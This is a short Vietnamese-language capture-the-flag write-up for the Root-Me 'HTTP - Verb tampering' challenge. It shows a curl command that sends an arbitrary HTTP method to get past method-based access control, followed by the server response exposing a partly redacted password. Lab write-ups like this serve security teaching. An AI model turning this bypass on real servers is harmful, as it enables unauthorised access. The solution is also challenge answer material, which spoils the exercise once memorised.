# HTTP - Verb tampering

## Solution

- Sử dụng `curl` để lấy URL:

```
curl -X YYYYY http://challenge01.root-me.org/web-serveur/ch8/

-X trong curl cho phép khai báo một phương thức. Nếu thử "GET" hoặc "POST", sẽ thấy rằng không thể truy cập được. Thay vào đó, hãy sử dụng 'HTTP' hoặc một phương thức lạ như "YYYY, ZZZZ, ABCD" và sẽ có quyền truy cập:

HTTP/1.1 200 OK
Server: nginx
Date: Wed, 08 Jul 2015 19:48:44 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Vary: Accept-Encoding


<quote><</quote>
!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<html><head>
</head>

<h1>Mot de passe / password : a23e$[...]rap</h1>
</body></html>
```